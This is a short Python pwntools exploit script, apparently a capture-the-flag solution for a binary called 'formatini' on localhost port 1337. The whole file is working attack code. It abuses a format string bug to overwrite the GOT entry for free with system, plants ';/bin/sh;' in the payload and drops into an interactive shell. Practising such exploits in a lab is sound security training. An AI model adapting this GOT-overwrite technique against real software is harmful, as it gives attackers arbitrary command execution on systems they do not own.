#!/usr/bin/python3
from pwn import *
import sys

HOST, PORT = "localhost", 1337

context.clear(arch="amd64")
elf = ELF("../challenge/formatini")

def connect():
    if len(sys.argv) > 1:
        p = remote(HOST, PORT)
    else:
        p = process(elf.path)
    return p

def trigger_fmt(payload):
    p = connect()
    p.sendlineafter("? ", payload)
    return p.recvuntil("cya!\n")

writes = {elf.got["free"]: elf.plt["system"]}

autofmt = FmtStr(trigger_fmt)
payload = fmtstr_payload(autofmt.offset + 2, writes)
payload = flat(
    payload[:payload.index(p64(elf.got["free"]))],
    b";/bin/sh;".ljust(8 * 2, b"#"),
    payload[payload.index(p64(elf.got["free"])):],
)

p = connect()
p.sendlineafter("? ", payload)
p.interactive()
